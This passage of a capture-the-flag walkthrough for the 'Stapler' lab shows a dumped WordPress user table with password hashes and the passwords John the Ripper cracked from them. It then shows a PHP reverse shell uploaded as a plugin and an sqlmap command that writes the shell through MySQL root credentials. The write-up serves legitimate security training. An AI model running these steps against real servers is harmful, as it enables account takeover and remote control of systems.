</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> John       <span class="p">|</span> <span class="nv">$P$B7889EMq</span>/erHIuZapMB8GEizebcIy9. <span class="p">|</span> john          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#106;&amp;#x6f;&amp;#104;&amp;#x6e;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6a;&amp;#111;&amp;#104;&amp;#x6e;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#x74;&lt;/a&gt;    | &lt;a href=&quot;http://localhost&quot;&gt;http://localhost&lt;/a&gt; | 2016-06-03 23:18:47 |                     |           0 | John Smith      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Elly       <span class="p">|</span> <span class="nv">$P$BlumbJRRBit7y50Y17</span>.UPJ/xEgv4my0 <span class="p">|</span> elly          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#69;&amp;#x6c;&amp;#108;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#69;&amp;#108;&amp;#x6c;&amp;#x79;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Peter      <span class="p">|</span> <span class="nv">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span> <span class="p">|</span> peter         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x70;&amp;#101;&amp;#116;&amp;#x65;&amp;#114;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x70;&amp;#x65;&amp;#x74;&amp;#101;&amp;#x72;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> barry      <span class="p">|</span> <span class="nv">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span> <span class="p">|</span> barry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#98;&amp;#x61;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#98;&amp;#x61;&amp;#114;&amp;#114;&amp;#121;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> heather    <span class="p">|</span> <span class="nv">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10 <span class="p">|</span> heather       <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x68;&amp;#x65;&amp;#97;&amp;#x74;&amp;#104;&amp;#101;&amp;#x72;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#104;&amp;#x65;&amp;#x61;&amp;#x74;&amp;#104;&amp;#101;&amp;#114;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt; |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> garry      <span class="p">|</span> <span class="nv">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1 <span class="p">|</span> garry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#103;&amp;#x61;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#103;&amp;#97;&amp;#x72;&amp;#114;&amp;#x79;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> harry      <span class="p">|</span> <span class="nv">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0 <span class="p">|</span> harry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#x68;&amp;#x61;&amp;#x72;&amp;#114;&amp;#x79;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x68;&amp;#97;&amp;#x72;&amp;#114;&amp;#x79;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> scott      <span class="p">|</span> <span class="nv">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span> <span class="p">|</span> scott         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#115;&amp;#x63;&amp;#111;&amp;#x74;&amp;#116;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#x63;&amp;#111;&amp;#x74;&amp;#116;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> kathy      <span class="p">|</span> <span class="nv">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0 <span class="p">|</span> kathy         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x6b;&amp;#x61;&amp;#x74;&amp;#x68;&amp;#x79;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6b;&amp;#x61;&amp;#x74;&amp;#104;&amp;#121;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim        <span class="p">|</span> <span class="nv">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0 <span class="p">|</span> tim           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#116;&amp;#x69;&amp;#x6d;&amp;#x40;&amp;#x72;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x74;&amp;#x69;&amp;#x6d;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#116;&lt;/a&gt;     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> ZOE        <span class="p">|</span> <span class="nv">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1 <span class="p">|</span> zoe           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x7a;&amp;#111;&amp;#x65;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#46;&amp;#x6c;&amp;#111;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x7a;&amp;#111;&amp;#101;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt;     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> Dave       <span class="p">|</span> <span class="nv">$P$Bl7</span>/V9Lqvu37jJT.6t4KWmY.v907Hy. <span class="p">|</span> dave          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#100;&amp;#x61;&amp;#x76;&amp;#101;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#100;&amp;#97;&amp;#x76;&amp;#x65;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt;    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">13</span> <span class="p">|</span> Simon      <span class="p">|</span> <span class="nv">$P$BLxdiNNRP008kOQ</span>.jE44CjSK/7tEcz0 <span class="p">|</span> simon         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x73;&amp;#x69;&amp;#x6d;&amp;#x6f;&amp;#x6e;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#x69;&amp;#x6d;&amp;#x6f;&amp;#110;&amp;#x40;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> Abby       <span class="p">|</span> <span class="nv">$P$ByZg5mTBpKiLZ5KxhhRe</span>/uqR.48ofs. <span class="p">|</span> abby          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#x61;&amp;#98;&amp;#98;&amp;#x79;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#98;&amp;#98;&amp;#x79;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt;    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> Vicki      <span class="p">|</span> <span class="nv">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span> <span class="p">|</span> vicki         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#118;&amp;#105;&amp;#99;&amp;#107;&amp;#105;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#118;&amp;#x69;&amp;#x63;&amp;#x6b;&amp;#105;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#108;&amp;#x6f;&amp;#99;&amp;#97;&amp;#x6c;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">16</span> <span class="p">|</span> Pam        <span class="p">|</span> <span class="nv">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span> <span class="p">|</span> pam           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x70;&amp;#97;&amp;#x6d;&amp;#64;&amp;#114;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x70;&amp;#x61;&amp;#x6d;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt;     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">16</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use <code>john the ripper</code> to crack those hahses and got the following cracked:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# john <span class="p">&amp;</span>ndash<span class="p">;</span>show 2.txt
</span><span class='line'>John:incorrect
</span><span class='line'>Elly:ylle
</span><span class='line'>barry:washere
</span><span class='line'>heather:passphrase
</span><span class='line'>garry:football
</span><span class='line'>harry:monkey
</span><span class='line'>scott:cookie
</span><span class='line'>kathy:coolgirl
</span><span class='line'>tim:thumb
</span><span class='line'>ZOE:partyqueen
</span><span class='line'>Dave:damachine
</span><span class='line'>Pam:0520&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;12 password hashes cracked, <span class="m">4</span> left
</span></code></pre></td></tr></table></div></figure></p>

<p>After tried all cracked user/password, I found <code>john</code> has higher priviledge and can be used to upload reverse web shell.</p>

<p>Login to WordPress with john&rsquo;s password, and then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s PHP reverse shell</a>(listen on local port 443) as a plugin.</p>

<p><img class="left" src="/downloads/stapler/4.png"></p>

<p>After installed the plugin, I went to <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/</code> to check if the file has been uploaded.</p>

<p><img class="left" src="/downloads/stapler/5.png"></p>

<p>Greet! The web shell file <code>rsh.php</code> has already been uploaded successfully.</p>

<p>In terms to upload web shell, there is another method by using MySQL to write file.</p>

<p>From the previous stage, I got the full path is <font color="red"><code>/var/www/https/blogblog/</code></font> and also the writable directory is <font color="red"><code>/blogblog/wp-content/uploads/</code></font>. And the target MySQL root login password is <font color="red"><code>plbkac</code></font>.</p>

<p>So, now, I should be able to write web shell to target server via MySQL:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# sqlmap -d mysql://root:plbkac@10.1.1.138:3306/wordpress <span class="p">&amp;</span>ndash<span class="p">;</span>file-write<span class="o">=</span>rsh.php <span class="p">&amp;</span>ndash<span class="p">;</span>file-dest<span class="o">=</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.5.0#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 23:12:04&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 established
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fingerprinting the back-end DBMS operating system
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;0&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS operating system is Linux
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="k">do</span> you want confirmation that the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> has been successfully written on the back-end DBMS file system <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>? <span class="o">[</span>Y/n<span class="o">]</span> Y
